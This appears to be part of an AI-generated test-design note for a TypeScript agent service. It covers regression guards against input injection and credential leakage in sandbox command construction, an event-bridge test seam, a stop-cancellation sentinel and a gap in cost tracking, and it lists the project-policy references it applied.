- **Regression guard template IS applied** — Story 6.3 constructs the sandbox-agent command from user-controlled input (the message). Four credential-isolation + input-injection regression guards created in `agent.service.unit.spec.ts`. Sibling test files consulted: `sandbox.service.session.spec.ts` (Story 6.2) and `sandbox.service.nfr-s1.spec.ts` (Story 3.8/6.1). See Regression Guard Template Check above.
- **Test seam applied (not skipped):** `onEvent?: (event: SseEvent) => void` on `AguiEventBridgeParams` in `agui-event-bridge.service.ts` is active infrastructure (backward-compatible optional field). The dev implements the branching logic in `processAgentEvent()` (Task 1.1).
- **Cast-based construction:** The `createAgentServiceWithBridge` helper uses a cast to construct `AgentService` with the future 6-arg constructor. The dev removes the cast after Task 2.2 updates the constructor to accept `AguiEventBridgeService`.
- **AGENT_STOPPED sentinel:** The event bridge rejects with `Error('AGENT_STOPPED')` on stop-initiated cancellation (Story 6.2). `AgentService.runTurn()`'s catch block checks `err.message === 'AGENT_STOPPED'` to skip `RUN_ERROR` emission. This is a contract between the two services — documented in both the story spec and the test.
- **Cost data gap:** If sandbox-agent surfaces cost data inside a `RUN_FINISHED` event's `data` payload, the `onEvent` callback intercepts it. If not, cost tracking becomes a no-op until sandbox-agent supports it. The test "onEvent captures cost data from RUN_FINISHED data payload" verifies the intercept path. The dev documents the gap in Task 4.1 if sandbox-agent does not surface cost data.

---

## Knowledge Base References Applied

- **project-context.md:156** — Shell-quote all interpolated values in sandbox process commands (applied to regression guards — verify command construction shell-quotes user input)
- **project-context.md:144** — Test-seam fakes mimic production side effects (applied to mock AguiEventBridgeService — reproduces onEvent invocation side effects)
- **project-context.md:143** — `ISandboxService` test seam (applied — AgentService calls through AguiEventBridgeService which calls through ISandboxService)
- **project-context.md:168** — Silent rejection for backend guards against UI-prevented races (applied to concurrent-turn guard — second runTurn rejected silently, no SSE emit)
- **project-context.md:155** — `OnModuleDestroy` for in-process state cleanup (applied to onModuleDestroy rewrite — delegates to event bridge stop)
- **project-context.md:170** — Bounded parallel drain (reference for onModuleDestroy — fire-and-forget stop calls with .catch)
- **decision-policy.md DP-3** — All options reversible + architecture-consistent → pick simplest (applied to onEvent callback — simplest observation mechanism)
- **decision-policy.md DP-4** — Test-only changes → decide autonomously (applied to onEvent test seam, skipped test blocks, cast-based construction helper)
- **decision-policy.md DP-5** — Scope temptation → defer, don't expand (applied to E2E deferral for all ACs)

---

**Generated by BMad TEA Agent** - 2026-07-16
